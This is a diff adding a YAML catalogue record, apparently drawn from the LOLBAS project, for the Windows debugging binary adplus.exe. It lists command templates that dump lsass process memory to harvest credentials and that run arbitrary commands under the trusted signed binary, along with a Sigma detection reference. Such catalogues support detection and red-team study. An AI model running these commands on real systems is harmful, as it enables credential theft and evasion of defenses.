@@ -1,0 +1,106 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL0FkcGx1cy55bWw/RHVtcA/0
+type: binary
+platform: windows
+name: adplus.exe
+phases:
+- credential-access
+capabilities:
+- credential-dump
+privilege_required: system
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1003.001
+opsec:
+  noise: high
+  triggers: As a Windows SDK binary, execution on a system may be suspicious
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml
+commands:
+- template: adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
+  comment: Creates a memory dump of the lsass process
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: adplus.exe
+      category: Dump
+      privileges: SYSTEM
+      mitre_id: T1003.001
+      source_file: OtherMSBinaries/Adplus.yml
+      command_source_index: 0
+      document_utf8: "---\nName: adplus.exe\nDescription: Debugging tool included with Windows Debugging\
+        \ Tools\nAuthor: mr.d0x\nCreated: 2021-09-01\nCommands:\n  - Command: adplus.exe -hang -pn lsass.exe\
+        \ -o {PATH_ABSOLUTE:folder} -quiet\n    Description: Creates a memory dump of the lsass process\n\
+        \    Usecase: Create memory dump and parse it offline\n    Category: Dump\n    Privileges: SYSTEM\n\
+        \    MitreID: T1003.001\n    OperatingSystem: All Windows\n  - Command: adplus.exe -c {PATH:.xml}\n\
+        \    Description: Execute arbitrary commands using adplus config file (see Resources section for\
+        \ a sample file).\n    Usecase: Run commands under a trusted Microsoft signed binary\n    Category:\
+        \ Execute\n    Privileges: User\n    MitreID: T1127\n    OperatingSystem: All Windows\n    Tags:\n\
+        \      - Execute: CMD\n  - Command: adplus.exe -c {PATH:.xml}\n    Description: Dump process memory\
+        \ using adplus config file (see Resources section for a sample file).\n    Usecase: Run commands\
+        \ under a trusted Microsoft signed binary\n    Category: Dump\n    Privileges: SYSTEM\n    MitreID:\
+        \ T1003.001\n    OperatingSystem: All Windows\n  - Command: adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\"\
+        \ -sc {PATH:.exe}\n    Description: Execute arbitrary commands and binaries from the context of\
+        \ adplus. Note that providing an output directory via '-o' is required.\n    Usecase: Run commands\
+        \ under a trusted Microsoft signed binary\n    Category: Execute\n    Privileges: User\n    MitreID:\
+        \ T1127\n    OperatingSystem: All windows\n    Tags:\n      - Execute: CMD\n      - Execute: EXE\n\
+        Full_Path:\n  - Path: C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\adplus.exe\n\
+        \  - Path: C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\adplus.exe\nCode_Sample:\n\
+        \  - Code: https://gist.github.com/nasbench/e34ca2cd90e3a845a558a102a4f607da\nDetection:\n  -\
+        \ Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml\n\
+        \  - IOC: As a Windows SDK binary, execution on a system may be suspicious\nResources:\n  - Link:\
+        \ https://mrd0x.com/adplus-debugging-tool-lsass-dump/\n  - Link: https://twitter.com/nas_bench/status/1534916659676422152\n\
+        \  - Link: https://twitter.com/nas_bench/status/1534915321856917506\nAcknowledgement:\n  - Person:\
+        \ mr.d0x\n    Handle: '@mrd0x'\n  - Person: Nasreddine Bencherchali\n    Handle: '@nas_bench'\n"
+      document_sha256: sha256:1755341a5bc7d63407000d6e273a402e2ff8eebf160e3c0664cd077ef6430427
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: credential-dump
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1003.001
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: system
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:6cab9b66dc7ec5a0b446bd9fcc14018d70354a62a567a9b7be81bd6181a575da
